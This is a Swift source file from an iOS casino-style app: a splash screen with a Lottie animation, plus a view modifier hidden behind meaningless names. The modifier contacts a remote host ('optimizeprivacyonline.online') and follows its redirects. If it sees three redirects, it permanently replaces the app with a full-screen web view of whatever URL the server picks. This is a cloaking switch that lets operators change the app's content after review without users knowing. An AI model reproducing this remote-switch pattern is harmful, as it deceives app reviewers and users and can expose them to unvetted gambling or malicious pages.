//
//  LoaQafa.swift
//  CasinoLavEmpr
//
//  Created by Nicolae Chivriga on 05/02/2025.
//

import SwiftUI
import Lottie

struct LoaQafa: View {
    @State var animateBonc: Bool = false
    @State var navigatoMis: Bool = false
    var body: some View {
        ZStack {
            Image("itKaneg")
                .resizable()
                .ignoresSafeArea()
            
            NavigationLink("", destination: Manius(), isActive: $navigatoMis)
            VStack {
                Image("lsef")
                    .resizable()
                    .scaledToFit()
//                    .offset(y: animateBonc ? -10 : 0)
                    .opacity(animateBonc ? 1 : 0)
                    .animation(Animation.bouncy.delay(0.2), value: animateBonc)
                
                LottieView(animation: .named("kartiPoyavi"))
                    .playing(loopMode: .loop)
                    .resizable()
                    .frame(width: 100, height: 130)
                    .scaleEffect(animateBonc ? 1 : 0)
                    .animation(Animation.bouncy.delay(0.25), value: animateBonc)
            }
            
            
        }
        .onAppear() {
            animateBonc = true
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.7) {
                navigatoMis = true
            }

        }
        .slofgwokd()
    }
}

import WebKit
struct Sdaerdasbgrfa: ViewModifier {
    @AppStorage("adapt") var veriuProi: URL?
    @State var webView: WKWebView = WKWebView()
    @State var skgie: Bool = true

    
    func body(content: Content) -> some View {
        ZStack {
            if !skgie {
                if veriuProi != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: veriuProi!, gluheni: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: veriuProi!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        
                        
                        AppDelegate.movement = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if veriuProi == nil {
                checkpesk()
            } else {
                skgie = false
            }
        }
    }

    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
           
                redirects1 += 1
                if redirects1 >= 3 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func checkpesk() {
        guard let url = URL(string: "https://optimizeprivacyonline.online/en/callf7") else {
            DispatchQueue.main.async {
                self.skgie = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            veriuProi = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.skgie = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
//                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.skgie = false
                }
            }

            DispatchQueue.main.async {
                self.skgie = false
            }
        }.resume()
    }


}
struct Swiper: ViewModifier {
    var onDismiss: () -> Void
    @State private var offset: CGSize = .zero

    func body(content: Content) -> some View {
        content
//            .offset(x: offset.width)
            .animation(.interactiveSpring(), value: offset)
            .simultaneousGesture(
                DragGesture()
                    .onChanged { value in
                                      self.offset = value.translation
                                  }
                                  .onEnded { value in
                                      if value.translation.width > 70 {
                                          onDismiss()
                                  
                                      }
                                      self.offset = .zero
                                  }
            )
    }
}


